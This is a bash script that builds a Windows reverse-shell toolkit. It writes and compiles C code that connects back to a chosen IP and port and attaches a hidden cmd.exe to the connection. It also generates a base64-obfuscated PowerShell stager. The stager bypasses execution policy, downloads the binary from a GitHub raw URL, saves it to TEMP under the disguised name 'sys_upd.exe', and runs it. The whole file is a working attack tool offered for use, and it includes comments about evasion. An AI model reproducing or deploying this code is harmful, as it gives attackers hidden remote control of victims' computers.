#!/bin/bash

# --- CONFIGURATION ---
# The URL where you will host the compiled payload.binary
GITHUB_URL="https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/payload.binary"

echo -e "\e[1;32m[*]\e[0m Building Native C Victim with Handshake Logic..."

# 1. Create Native C Source (Handles Handshake + Arg-based IP/Port)
cat <<EOF > native_victim.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

int main(int argc, char *argv[]) {
    // Expects: payload.exe <ip> <port>
    if (argc < 3) return 1;
    char *ip = argv[1];
    int port = atoi(argv[2]);

    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    // --- PHASE 1: HANDSHAKE ---
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
        send(s, "WINDOWS_SHELL\n", 14, 0); // Send handshake to identify platform
        closesocket(s);
    }
    
    Sleep(2000); // Wait for listener to cycle back to nc

    // --- PHASE 2: PERSISTENT SHELL ---
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
        si.wShowWindow = SW_HIDE; // Hidden window for evasion

        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    return 0;
}
EOF

# 2. Compile for Windows
x86_64-w64-mingw32-gcc native_victim.c -o payload.binary -lws2_32 -mwindows

if [ ! -f payload.binary ]; then
    echo -e "\e[1;31m[-] Error: Compilation failed.\e[0m"
    exit 1
fi

echo -e "\e[1;32m[+]\e[0m Native payload generated: \e[1;33mpayload.binary\e[0m"

# 3. Create Shortened PowerShell Stager
# This script downloads the binary, saves it to TEMP, and passes arguments.
STAGER="param(\$ip, \$port); \$f='\$env:TEMP\sys_upd.exe'; (New-Object Net.WebClient).DownloadFile('$GITHUB_URL', \$f); Start-Process \$f -ArgumentList \"\$ip \$port\""

# 4. Final Obfuscated Encoding
FINAL_B64=$(echo -n "$STAGER" | iconv -t utf16le | base64 -w 0)

# Create the final .ps1 file
echo "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $FINAL_B64 -Args" > windows_client.ps1

echo -e "\e[1;32m[+]\e[0m Deployment script created: \e[1;33mwindows_client.ps1\e[0m"
echo -e "\e[1;34m[*] ACTION REQUIRED:\e[0m Upload 'payload.binary' to your GitHub before executing."

# Cleanup
rm native_victim.c
